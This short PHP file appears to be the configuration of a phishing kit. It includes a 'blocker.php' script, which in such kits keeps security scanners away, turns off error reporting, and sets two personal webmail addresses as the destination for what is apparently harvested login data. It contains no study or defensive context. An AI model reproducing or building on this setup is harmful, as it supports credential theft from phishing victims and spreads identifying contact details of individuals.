<?php
include('blocker.php');
error_reporting(0);
$ur_email   = "frankraheem00@gmail.com, raheem.frank@yandex.com";
define("EMAIL", "$ur_email");
?>